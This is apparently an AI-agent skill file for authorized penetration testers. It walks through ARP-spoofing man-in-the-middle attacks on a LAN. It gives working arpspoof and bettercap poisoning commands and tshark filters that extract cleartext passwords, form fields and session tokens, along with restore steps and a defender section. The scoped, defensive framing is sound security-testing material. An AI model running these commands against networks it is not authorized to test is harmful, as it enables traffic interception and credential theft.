---
name: arp-spoofing
description: Use when performing authorized man-in-the-middle testing on a
  local network segment. Covers how ARP works and why it trusts anyone,
  enabling IP forwarding, poisoning a target and gateway with arpspoof or
  bettercap, capturing and filtering traffic with Wireshark and tshark,
  spotting cleartext credentials and session tokens, and restoring the
  network cleanly. Use when the scope allows MITM on a lab or client LAN
  and you need to prove cleartext protocols or session exposure.
version: 1.0.0
domain: network
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [recon-active, network-pivoting]
tools:
  - name: dsniff
    version: "2.4"
  - name: Wireshark
    version: "4.4"
  - name: Python
    version: "3.12"
---

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a
LAN, and it believes whoever answers last. ARP spoofing exploits that
trust: you tell the victim you are the gateway and tell the gateway you
are the victim, so traffic flows through your machine. This skill covers
authorized MITM testing on a local segment: enabling forwarding, running
the spoof with arpspoof or bettercap, capturing traffic, finding cleartext
credentials, and, critically, restoring ARP tables when you finish. This is
lab and explicitly scoped LAN work only; spoofing on networks you do not
own or have permission to test is illegal. All testing targets systems you
have written permission to test.

## Quick Workflow

1. Confirm the LAN segment and the target and gateway addresses are in the
   written scope.
2. Enable IP forwarding so the victim keeps working through you.
3. Start the ARP spoof: poison the victim against the gateway and the
   gateway against the victim.
4. Verify you are in the middle by watching traffic flow.
5. Capture traffic and hunt for cleartext credentials, tokens, and
   interesting protocols.
6. Stop the spoof and restore correct ARP entries on both sides.
7. Verify the victim and gateway communicate normally again.

## 1. Understand the moving parts

On the test LAN you need three addresses: your attack box, the victim, and
the gateway (or any second victim for a victim to victim spoof). Learn the
MAC addresses first so you can tell poisoned entries from real ones later.

```bash
# Your address and interface
ip -4 addr show dev eth0 | grep inet

# Victim and gateway MACs before any spoofing (baseline)
ping -c1 192.168.1.10 >/dev/null && ip neigh show 192.168.1.10
ping -c1 192.168.1.1 >/dev/null && ip neigh show 192.168.1.1

# Save the true gateway MAC for the restore step
ip neigh show 192.168.1.1 | awk '{print $5}' > /tmp/true-gw-mac.txt
cat /tmp/true-gw-mac.txt
```

## 2. Enable IP forwarding

Without forwarding, the victim loses connectivity the moment you poison
them, which is a denial of service, not a MITM. Enable forwarding first,
every time.

```bash
# Enable IPv4 forwarding for this session
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify it stuck
cat /proc/sys/net/ipv4/ip_forward
# Expect: 1

# Make it survive the session if the test runs long (optional)
echo "net.ipv4.ip_forward=1" | sudo tee /etc/sysctl.d/99-mitm.conf
sudo sysctl -p /etc/sysctl.d/99-mitm.conf
```

On the victim side nothing changes; forwarding is only your box passing
packets between victim and gateway like a router.

## 3. Run the ARP spoof

The classic tool is `arpspoof` from dsniff. Run two instances: one poisons
the victim (telling it you are the gateway), the other poisons the gateway
(telling it you are the victim). Bidirectional poisoning catches traffic
both ways.

```bash
# Terminal 1: poison the victim (victim thinks your MAC is the gateway)
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# Terminal 2: poison the gateway (gateway thinks your MAC is the victim)
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
```

The `-t` flag targets one host; without it, arpspoof poisons the whole
LAN, which is noisy and usually out of scope. Keep both running for the
whole capture.

```bash
# bettercap alternative: one command, cleaner control
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.1.10;
  arp.spoof on;
  net.sniff on;
"
# Stop with: arp.spoof off (bettercap restores ARP tables automatically)
```

Verify the poison took effect from the victim's point of view. On your
box you cannot see the victim's ARP table directly, but you can confirm
traffic is flowing through you (next section). If you have a shell on the
victim (lab), check `arp -a` there: the gateway IP should show your MAC.

## 4. Capture and inspect traffic

Capture on your interface while the spoof runs. Filter aggressively so you
find credentials instead of drowning in packets.

```bash
# Capture victim traffic to a file
sudo tshark -i eth0 -f "host 192.168.1.10" -w /tmp/mitm.pcap &
TSHARK=$!

# Watch HTTP requests live in another terminal
sudo tshark -i eth0 -f "host 192.168.1.10" -Y http.request -T fields \
  -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value \
  2>/dev/null | head -40
```

```bash
# After capture: hunt credentials in the pcap
tshark -r /tmp/mitm.pcap -Y 'http.request.method == POST' -T fields \
  -e http.file_data | grep -i -E 'user|pass|token' | head -20

# FTP, Telnet, and other cleartext protocols
tshark -r /tmp/mitm.pcap -Y 'ftp.request.command == "PASS" or telnet' \
  -T fields -e ftp.request.arg -e telnet.data | head -20

# DNS queries the victim makes (reveals browsing and internal names)
tshark -r /tmp/mitm.pcap -Y dns.qry.name -T fields -e dns.qry.name \
  | sort -u | head -40
```

High value finds: HTTP logins, FTP/Telnet passwords, SNMP community
strings, internal hostnames from DNS, session cookies on non-HTTPS sites,
and email credentials on unencrypted POP3/IMAP. Each finding needs the
protocol, the redacted evidence, and the timestamp.

## 5. Prove it without damage

The report needs proof you were in the middle and what was exposed. Safe
proofs: a screenshot of the victim's poisoned ARP table, a tshark line
showing a cleartext login (redact the password in the report), and a
before/after of the ARP restore. Do not modify traffic, inject content, or
hijack sessions during a standard MITM test; interception proof is enough.

## 6. Restore the network

This step is not optional. When you stop poisoning, both sides keep the
wrong MAC until their ARP entries expire, which can blackhole traffic for
minutes. Restore actively.

```bash
# Stop arpspoof in both terminals with Ctrl-C, then fix the entries
# Send correct ARP replies: victim learns the real gateway MAC again
GW_MAC=$(cat /tmp/true-gw-mac.txt)
sudo arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 >/dev/null 2>&1 &
sleep 3; sudo pkill -f "arpspoof.*192.168.1.10"

# bettercap restores automatically on 'arp.spoof off'; verify anyway
ping -c2 192.168.1.10 && ping -c2 192.168.1.1
```

```bash
# Final verification: victim should reach the internet again
# (run from the victim in a lab, or ask the client contact to confirm)
# On your box, confirm forwarding is back to normal use and stop captures
sudo pkill tshark
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

If you used bettercap, its `arp.spoof off` sends corrective ARPs itself;
still verify with pings. Never leave a test with poisoned tables behind.

## Edge cases

- The victim uses a static ARP entry for the gateway. Your spoofed replies
  are ignored; note the control as a positive finding and move on.
- The switch has Dynamic ARP Inspection (DAI). Spoofed ARPs get dropped
  at the port; you will see no traffic and the attack silently fails.
- The victim is on Wi-Fi with client isolation. Clients cannot ARP each
  other at all; MITM from wireless to wireless is impossible here.
- IP forwarding was forgotten. The victim loses connectivity immediately;
  enable forwarding and restart the spoof, and note the brief outage.
- arpspoof says `couldn't arp for host`. The target is down or on a
  different segment; recheck addresses and your interface.
- HTTPS everywhere. You will see hostnames via SNI and DNS but no
  content; that is the expected result on a well configured network, and
  stripping TLS is out of scope for this skill.
- The gateway is also the DHCP server with short leases. DHCP renewals
  can reset ARP tables mid-test; shorten your capture windows.

## Escalation

- One victim works but you need the whole segment. Only expand targets
  with written approval; each new target is a new line in the scope.
- Cleartext protocols found. Document each with protocol, port, and a
  redacted sample; recommend TLS or VPN for each one specifically.
- You need session hijacking proof. That crosses into active session
  attacks; get explicit approval first, then use bettercap's proxy
  modules rather than hand-rolled injection.
- The network blocks your spoof entirely (DAI, static ARP). Report the
  controls as effective and pivot to other LAN attacks in scope, such as
  LLMNR poisoning (see llmnr-poisoning).

## Detection and defender view

Defenders see ARP spoofing as duplicate MAC claims: the same IP announced
from two MACs, gratuitous ARP storms from one host, and ARP table
flapping. Tools like arpwatch, XArp, and NDR sensors alert on exactly
this. Wireshark shows it clearly with the filter `arp.duplicate-address-
detected`. The durable fixes: Dynamic ARP Inspection on managed switches,
static ARP entries for critical hosts (gateway, servers), 802.1X port
authentication so rogue devices cannot join, and encrypting everything so
a successful MITM still sees only ciphertext. Segment the LAN so one
poisoned broadcast domain cannot reach the crown jewels.

## Key references

- MITRE ATT&CK T1557 (Adversary-in-the-Middle): ARP spoofing is the
  classic LAN instance.
- CWE-306 (Missing Authentication for Critical Function): ARP trusts
  unauthenticated replies.
- CWE-319 (Cleartext Transmission of Sensitive Information): what the
  MITM position exposes.
- IETF RFC 826 (Address Resolution Protocol).
- dsniff (arpspoof) documentation: https://www.monkey.org/~dugsong/dsniff/
- bettercap documentation: https://www.bettercap.org/
- Wireshark ARP display filters: https://wiki.wireshark.org/ARP
